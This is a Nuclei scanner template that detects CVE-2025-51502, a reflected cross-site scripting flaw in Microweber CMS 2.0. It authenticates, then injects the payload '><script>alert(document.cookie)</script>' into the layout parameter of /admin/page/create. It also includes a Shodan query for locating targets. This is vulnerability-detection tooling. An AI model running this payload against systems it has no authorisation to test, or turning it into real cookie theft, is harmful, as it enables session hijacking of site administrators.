flow: http(1) && http(2)
http:
- matchers:
  - condition: and
    dsl:
    - status_code == 200
    - contains(content_type, "application/json")
    - contains_all(body, "success\":", "username\":")
    internal: true
    type: dsl
  raw:
  - 'POST /api/user_login HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/x-www-form-urlencoded; charset=UTF-8


    username={{username}}&password={{password}}&lang=en_US&where_to=admin_content

    '
- matchers:
  - condition: and
    dsl:
    - status_code == 200
    - contains(content_type, "text/html")
    - contains(body, "><script>alert(document.cookie)</script>")
    type: dsl
  raw:
  - 'GET /admin/page/create?layout="{{xss_payload}} HTTP/1.1

    Host: {{Hostname}}

    '
id: CVE-2025-51502
info:
  author: nukunga
  description: 'Reflected Cross-Site Scripting (XSS) exists in Microweber CMS 2.0
    through the layout parameter on the /admin/page/create page. It allows arbitrary
    JavaScript to execute in the context of authenticated admin users.

    '
  impact: 'Authenticated attackers can execute arbitrary JavaScript in victim browsers
    through the layout parameter in page creation, potentially enabling session hijacking
    and credential theft.

    '
  metadata:
    max-requests: 2
    product: microweber
    shodan-query: http.title:"Microweber"
    vendor: microweber
    verified: true
  name: Microweber CMS 2.0 - Reflected XSS in Admin Page Creation
  reference:
  - https://github.com/progprnv/CVE-Reports/blob/main/CVE-2025-51502
  - https://nvd.nist.gov/vuln/detail/CVE-2025-51502
  remediation: 'Upgrade Microweber CMS to a version later than 2.0 that properly sanitizes
    the layout parameter.

    '
  severity: medium
  tags: cve,cve2025,microweber,xss,authenticated,vuln
variables:
  xss_payload: '><script>alert(document.cookie)</script>'
